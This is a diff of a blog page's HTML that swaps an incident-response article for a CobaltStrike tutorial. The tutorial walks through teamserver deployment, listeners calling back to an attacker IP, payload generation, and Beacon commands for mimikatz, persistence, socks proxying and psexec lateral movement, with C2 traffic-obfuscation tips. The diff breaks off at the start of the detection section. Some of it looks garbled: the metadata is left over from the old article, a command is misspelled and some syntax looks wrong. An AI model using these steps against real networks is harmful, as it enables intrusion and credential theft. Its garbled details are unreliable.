@@ -1,108 +1,155 @@
-<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="不同类型安全事件的处置方式与事件溯源方法论：勒索/Webshell/爆破/横向等事件怎么处理，如何还原攻击链。"><title>应急响应处置与事件溯源实战</title><link rel=canonical href=https://souljian.cn/p/751088092/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="应急响应处置与事件溯源实战"><meta property='og:description' content="不同类型安全事件的处置方式与事件溯源方法论：勒索/Webshell/爆破/横向等事件怎么处理，如何还原攻击链。"><meta property='og:url' content='https://souljian.cn/p/751088092/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='应急响应'><meta property='article:tag' content='事件溯源'><meta property='article:tag' content='安全运维'><meta property='article:tag' content='日志分析'><meta property='article:tag' content='勒索'><meta property='article:published_time' content='2026-08-29T23:10:00+08:00'><meta property='article:modified_time' content='2026-08-29T23:10:00+08:00'><meta name=twitter:title content="应急响应处置与事件溯源实战"><meta name=twitter:description content="不同类型安全事件的处置方式与事件溯源方法论：勒索/Webshell/爆破/横向等事件怎么处理，如何还原攻击链。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="不同类型安全事件的处置方式与事件溯源方法论：勒索/Webshell/爆破/横向等事件怎么处理，如何还原攻击链。"><title>CobaltStrike 基础与 Beacon 实战</title><link rel=canonical href=https://souljian.cn/p/751088092/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="应急响应处置与事件溯源实战"><meta property='og:description' content="不同类型安全事件的处置方式与事件溯源方法论：勒索/Webshell/爆破/横向等事件怎么处理，如何还原攻击链。"><meta property='og:url' content='https://souljian.cn/p/751088092/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CobaltStrike'><meta property='article:tag' content='Beacon'><meta property='article:tag' content='C2'><meta property='article:tag' content='Teamserver'><meta property='article:tag' content='内网渗透'><meta property='article:published_time' content='2026-08-29T23:30:00+08:00'><meta property='article:modified_time' content='2026-08-30T10:00:00+08:00'><meta name=twitter:title content="应急响应处置与事件溯源实战"><meta name=twitter:description content="不同类型安全事件的处置方式与事件溯源方法论：勒索/Webshell/爆破/横向等事件怎么处理，如何还原攻击链。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
 <span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_d0e0f681fd935e1f.jpg width=300 height=303 class=site-logo loading=lazy alt=Avatar>
 </a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>SoulJian小站</a></h1><h2 class=site-description>人生所有的痛苦，皆来自于我执</h2></div></header><ol class=menu-social><li><a href=https://github.com/souljian03 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
 <span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
 <span>搜索</span></a></li><li><a href=/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
 <span>友情链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
 <svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
-<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一不同攻击类型--不同处置方式>一、不同攻击类型 → 不同处置方式</a><ol><li><a href=#0-应急处置通用步骤>0. 应急处置通用步骤</a></li><li><a href=#1-勒索软件事件>1. 勒索软件事件</a></li><li><a href=#2-webshell--网站入侵>2. WebShell / 网站入侵</a></li><li><a href=#3-弱口令爆破--账号被盗>3. 弱口令爆破 / 账号被盗</a></li><li><a href=#4-横向移动--内网沦陷>4. 横向移动 / 内网沦陷</a></li><li><a href=#5-挖矿--资源异常>5. 挖矿 / 资源异常</a></li></ol></li><li><a href=#二事件溯源方法论>二、事件溯源方法论</a><ol><li><a href=#1-定起点>1. 定起点</a></li><li><a href=#2-串时间线>2. 串时间线</a></li><li><a href=#3-找证据链>3. 找证据链</a></li><li><a href=#4-定影响面>4. 定影响面</a></li></ol></li><li><a href=#三溯源的关键证据源>三、溯源的关键证据源</a></li><li><a href=#四处置原则>四、处置原则</a></li><li><a href=#五小结>五、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/ style=background-color:#2a9d8f;color:#fff>安全服务</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088092/>应急响应处置与事件溯源实战</a></h2><h3 class=article-subtitle>不同类型安全事件的处置方式与事件溯源方法论：勒索/Webshell/爆破/横向等事件怎么处理，如何还原攻击链。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
-<time class=article-time--published datetime=2026-08-29T23:10:00+08:00>Aug 29, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>阅读时长: 1 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>应急响应面向真实事件，处理过程须保留证据、合法合规。</p><h2 id=一不同攻击类型--不同处置方式>一、不同攻击类型 → 不同处置方式</h2><blockquote><p>先取证再隔离（内存 → 磁盘 → 隔离），下图是标准取证流程。</p></blockquote><img src=/img/ir-forensic-flow.svg alt=应急响应取证流程图><h3 id=0-应急处置通用步骤>0. 应急处置通用步骤</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一cobaltstrike-是什么>一、CobaltStrike 是什么</a></li><li><a href=#二cobaltstrike-架构图>二、CobaltStrike 架构图</a></li><li><a href=#三部署-teamserver>三、部署 Teamserver</a></li><li><a href=#四配置-listener>四、配置 Listener</a></li><li><a href=#五生成-payload-并上线>五、生成 Payload 并上线</a></li><li><a href=#六beacon-常用命令>六、Beacon 常用命令</a></li><li><a href=#七横向移动>七、横向移动</a></li><li><a href=#八c2-profile-混淆>八、C2 Profile 混淆</a></li><li><a href=#九检测>九、检测</a></li><li><a href=#十防御>十、防御</a></li><li><a href=#十一小结>十一、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%B7%A5%E5%85%B7%E7%B1%BB/ style=background-color:#2a9d8f;color:#fff>工具类</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088092/>CobaltStrike 基础与 Beacon 实战</a></h2><h3 class=article-subtitle>CobaltStrike 完整入门：Teamserver 部署、Listener 配置、Beacon 上线、命令执行、横向移动、Socks 代理、C2 Profile 混淆与检测防御。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-08-29T23:30:00+08:00>Aug 29, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>CobaltStrike 只用于授权靶场。对非授权系统上线 C2 可能触犯法律。</p><h2 id=一cobaltstrike-是什么>一、CobaltStrike 是什么</h2><p>CobaltStrike 是业界最成熟的 C2 框架，模拟 APT 攻击链：上线 → 后渗透 → 横向 → 数据外泄。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Teamserver（C2 服务器）：运行在攻击者控制的 VPS/服务器上
+</span></span><span class=line><span class=cl>Client（攻击者 GUI）：通过加密 RPC 连接 Teamserver
+</span></span><span class=line><span class=cl>Beacon（载荷）：植入目标，定期与 Teamserver 通信
+</span></span></code></pre></td></tr></table></div></div><h2 id=二cobaltstrike-架构图>二、CobaltStrike 架构图</h2><img src=/img/cobaltstrike-architecture.svg alt="CobaltStrike 架构与 Beacon 通信图"><h2 id=三部署-teamserver>三、部署 Teamserver</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>第 1 步：确认事件并判断类型
-</span></span><span class=line><span class=cl>第 2 步：先做内存取证（易失证据）
-</span></span><span class=line><span class=cl>第 3 步：磁盘快照/镜像（持久证据）
-</span></span><span class=line><span class=cl>第 4 步：隔离主机（断外网/禁网卡/安全组）
-</span></span><span class=line><span class=cl>第 5 步：按类型排查（见下）
-</span></span><span class=line><span class=cl>第 6 步：清理加固、复测、溯源报告
-</span></span></code></pre></td></tr></table></div></div><h3 id=1-勒索软件事件>1. 勒索软件事件</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 下载 CS（需授权 License）</span>
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /opt/cs
+</span></span><span class=line><span class=cl>chmod +x teamserver
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 启动 Teamserver</span>
+</span></span><span class=line><span class=cl>./teamserver &lt;公网IP&gt; &lt;密码&gt;
+</span></span><span class=line><span class=cl><span class=c1># 例如：./teamserver 1.2.3.4 mypassword</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=四配置-listener>四、配置 Listener</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>第一时间：断网隔离，防止加密扩散
-</span></span><span class=line><span class=cl>保留证据：快照、样本（别乱删）
-</span></span><span class=line><span class=cl>处置：查入口（RDP爆破/漏洞/钓鱼）→ 找解密点
-</span></span><span class=line><span class=cl>善后：备份恢复、打补丁、封端口
-</span></span></code></pre></td></tr></table></div></div><h3 id=2-webshell--网站入侵>2. WebShell / 网站入侵</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Listener → Add
+</span></span><span class=line><span class=cl>  Name: my_listener
+</span></span><span class=line><span class=cl>  Type: http（或 https / dns / SMB）
+</span></span><span class=line><span class=cl>  Host: 1.2.3.4:80（攻击机公网 IP）
+</span></span><span class=line><span class=cl>  URI: /update.php（伪装路径，可自定义）
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>先断外网或限制目录写执行
-</span></span><span class=line><span class=cl>扫描全站 webshell，溯源上传入口
-</span></span><span class=line><span class=cl>查 Web 日志（上传/访问特征）
-</span></span><span class=line><span class=cl>清后门 → 修漏洞 → 加 WAF
-</span></span></code></pre></td></tr></table></div></div><h3 id=3-弱口令爆破--账号被盗>3. 弱口令爆破 / 账号被盗</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>HTTPS 更隐蔽：
+</span></span><span class=line><span class=cl>  Type: https
+</span></span><span class=line><span class=cl>  Host: https://example.com:443
+</span></span><span class=line><span class=cl>  URI: /api/v2/health
+</span></span><span class=line><span class=cl>  需绑定合法 SSL 证书
+</span></span></code></pre></td></tr></table></div></div><h2 id=五生成-payload-并上线>五、生成 Payload 并上线</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>查登录日志（成功登录时间、来源 IP）
-</span></span><span class=line><span class=cl>锁定异常登录，强制改密、下线会话
-</span></span><span class=line><span class=cl>查是否已横向（看该账号是否登录多机）
-</span></span><span class=line><span class=cl>收紧口令策略、开双因子
-</span></span></code></pre></td></tr></table></div></div><h3 id=4-横向移动--内网沦陷>4. 横向移动 / 内网沦陷</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Attacks → Web Drive-by → Payload Generator
+</span></span><span class=line><span class=cl>  Listener: my_listener
+</span></span><span class=line><span class=cl>  Format: windows/x64 (elf / exe / powershell / python)
+</span></span><span class=line><span class=cl>  生成 payload
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>重点：找到“失陷源头”和“扩散路径”
-</span></span><span class=line><span class=cl>查多主机同账号登录、异常计划任务/服务
-</span></span><span class=line><span class=cl>分段隔离，防继续扩散
-</span></span><span class=line><span class=cl>全量排查后门与凭据
-</span></span></code></pre></td></tr></table></div></div><h3 id=5-挖矿--资源异常>5. 挖矿 / 资源异常</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>看异常进程、异常外联（矿池地址）
-</span></span><span class=line><span class=cl>杀进程、清持久化（计划任务/服务）
-</span></span><span class=line><span class=cl>查入口，加固暴露面
-</span></span></code></pre></td></tr></table></div></div><h2 id=二事件溯源方法论>二、事件溯源方法论</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>目标：还原“怎么进来的 → 做了什么 → 留下了什么”
-</span></span></code></pre></td></tr></table></div></div><h3 id=1-定起点>1. 定起点</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>从告警/最早异常时间找入口
-</span></span><span class=line><span class=cl>入口优先级：Web 漏洞 &gt; 弱口令 &gt; 钓鱼 &gt; 供应链
-</span></span></code></pre></td></tr></table></div></div><h3 id=2-串时间线>2. 串时间线</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>按时间排列：登录、命令、文件、外联、持久化
-</span></span><span class=line><span class=cl>多主机日志交叉比对，找“跳板”路径
-</span></span></code></pre></td></tr></table></div></div><h3 id=3-找证据链>3. 找证据链</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>日志：登录/Web/防火墙/EDR
-</span></span><span class=line><span class=cl>文件：webshell、恶意样本、被改配置
-</span></span><span class=line><span class=cl>行为：进程、计划任务、服务、外联
-</span></span></code></pre></td></tr></table></div></div><h3 id=4-定影响面>4. 定影响面</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>哪些主机/账号/数据受影响
-</span></span><span class=line><span class=cl>哪些凭据可能已泄露
-</span></span></code></pre></td></tr></table></div></div><h2 id=三溯源的关键证据源>三、溯源的关键证据源</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 常用格式</span>
+</span></span><span class=line><span class=cl>exe：直接执行
+</span></span><span class=line><span class=cl>ps1：PowerShell 命令（内存执行，不落地）
+</span></span><span class=line><span class=cl>elf：Linux 载荷
+</span></span><span class=line><span class=cl>raw：shellcode（需手动执行）
+</span></span></code></pre></td></tr></table></div></div><h2 id=六beacon-常用命令>六、Beacon 常用命令</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>beacon&gt; ipconfig        # 查看网络
+</span></span><span class=line><span class=cl>beacon&gt; whoami          # 当前身份
+</span></span><span class=line><span class=cl>beacon&gt; sysinfo         # 系统信息
+</span></span><span class=line><span class=cl>beacon&gt; getuid          # 权限等级
+</span></span><span class=line><span class=cl>beacon&gt; run mimidatz    # 跑 mimikatz（内置）
+</span></span><span class=line><span class=cl>beacon&gt; run persistence # 持久化
+</span></span><span class=line><span class=cl>beacon&gt; socks           # 开 Socks 代理
+</span></span><span class=line><span class=cl>beacon&gt; portforward     # 端口转发
+</span></span><span class=line><span class=cl>beacon&gt; upload/download # 文件传输
+</span></span><span class=line><span class=cl>beacon&gt; execute-assembly # 加载 .NET 程序集
+</span></span><span class=line><span class=cl>beacon&gt; run psexec      # 横向 psexec
+</span></span><span class=line><span class=cl>beacon&gt; spawn           # 横向注入新 Beacon
+</span></span></code></pre></td></tr></table></div></div><h2 id=七横向移动>七、横向移动</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>登录日志（SSH/RDP/应用登录）
-</span></span><span class=line><span class=cl>Web 访问日志（攻击 payload）
-</span></span><span class=line><span class=cl>EDR/杀软告警（行为时间线）
-</span></span><span class=line><span class=cl>防火墙/态势感知（外联、横向）
-</span></span><span class=line><span class=cl>系统日志与命令历史
-</span></span><span class=line><span class=cl>文件时间线（mtime/ctime）
-</span></span></code></pre></td></tr></table></div></div><h2 id=四处置原则>四、处置原则</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>1. psexec：用凭据打 SMB
+</span></span><span class=line><span class=cl>  beacon&gt; run psexec \\目标IP username:password
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2. spawn（Beacon 注入 Beacon）：
+</span></span><span class=line><span class=cl>  beacon&gt; spawn 目标IP 目标用户名 密码
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>3. Socks 代理：
+</span></span><span class=line><span class=cl>  beacon&gt; socks 65535 1080
+</span></span><span class=line><span class=cl>  → 攻击机配置 proxychains 走 1080 端口
+</span></span></code></pre></td></tr></table></div></div><h2 id=八c2-profile-混淆>八、C2 Profile 混淆</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>C2 Profile 是 CS 用来混淆 Beacon 通信的配置文件：
+</span></span><span class=line><span class=cl>  • 修改 HTTP Header（User-Agent/Host/Referer）
+</span></span><span class=line><span class=cl>  • 修改 URI 路径
+</span></span><span class=line><span class=cl>  • 修改加密方式
+</span></span><span class=line><span class=cl>  • 增加延迟/抖动（模拟正常流量）
+</span></span><span class=line><span class=cl>  • 使用域名前置（Subdomain Fronting）
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>工具：
+</span></span><span class=line><span class=cl>  • malleable-c2（社区 C2 Profile 集合）
+</span></span><span class=line><span class=cl>  • CS Profile 生成器
+</span></span></code></pre></td></tr></table></div></div><h2 id=九检测>九、检测</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>先取证再处置（证据优先）
-</span></span><span class=line><span class=cl>遏制优先于清理（先止血）
-</span></span><span class=line><span class=cl>逐层清理（进程→文件→持久化→入口）
-</span></span><span class=line><span class=cl>处置后复测（确认后门不复活）
